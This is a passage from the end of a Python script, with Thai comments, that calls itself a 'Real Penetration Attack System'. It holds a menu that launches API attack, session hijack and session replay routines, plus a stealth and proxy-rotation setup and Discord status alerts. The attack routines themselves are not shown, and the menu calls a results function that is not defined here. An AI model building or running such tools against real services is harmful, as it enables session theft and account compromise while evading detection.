            print(f"❌ {file} - Missing!")
    
    # Create quick config
    quick_config = {
        "request_delay": 12,
        "max_attempts": 5,
        "use_proxy": False,
        "stealth_mode": True,
        "human_simulation": True,
        "rate_limit_delay": 15
    }
    
    with open('quick_fix_config.json', 'w') as f:
        json.dump(quick_config, f, indent=4)
    
    print("💾 สร้าง quick_fix_config.json")
    print("🚀 ใช้งาน Ultimate CSRF Fix เพื่อผลลัพธ์ที่ดีที่สุด")

def show_results():
    """แสดงผลลัพธ์"""
    print("📊 SUCCESS RESULTS")
    print("="*30)
    
    if os.path.exists('output'):
        import glob
        results = glob.glob('output/*.json')
        
        if results:
            print(f"📂 พบ {len(results)} ไฟล์ผลลัพธ์:")
            for result in results[-5:]:  # แสดง 5 ล่าสุด
                print(f"  📄 {os.path.basename(result)}")
        else:
            print("❌ ไม่พบผลลัพธ์")
    else:
        print("❌ ไม่พบโฟลเดอร์ output")

def main():
    """Main function สำหรับ Real Penetration Attack Menu"""
    while True:
        show_real_penetration_menu()
        
        choice = input("💀 เลือกโหมดการโจมตี (1-6): ").strip()
        
        if choice == "1":
            send_discord_alert("🚀 Advanced API Attack Started", "info")
            run_advanced_api_attack()
            send_discord_alert("✅ Advanced API Attack Completed", "success")
            break
        elif choice == "2":
            send_discord_alert("🔓 Session Hijack Attack Started", "info")
            run_session_hijack()
            send_discord_alert("✅ Session Hijack Attack Completed", "success")
            break
        elif choice == "3":
            send_discord_alert("🎭 Session Replay Attack Started", "info")
            run_session_replay()
            send_discord_alert("✅ Session Replay Attack Completed", "success")
            break
        elif choice == "4":
            setup_proxy_rotation()
            input("\nกด Enter เพื่อกลับเมนู...")
        elif choice == "5":
            setup_discord_alerts()
            input("\nกด Enter เพื่อกลับเมนู...")
        elif choice == "6":
            show_ultimate_results()
            input("\nกด Enter เพื่อกลับเมนู...")
        else:
            print("❌ เลือก 1-6 เท่านั้น")
    
    print("\n💀 Real Penetration Attack Complete! 🔥")

if __name__ == "__main__":
    print("💀 SugarGlitch Real Penetration Attack System")
    print("🔥 Dream Edition - 3 Working Methods")
    print("⚠️  For Educational and Authorized Testing Only")
    print("="*60)
    
    # Send startup notification
    send_discord_alert("💀 Real Penetration Attack System Started", "info")
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🛑 Attack interrupted by user")
        send_discord_alert("🛑 Attack Session Interrupted", "warning")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        send_discord_alert(f"❌ System Error: {str(e)}", "error")
    finally:
        send_discord_alert("🏁 Attack Session Ended", "info")
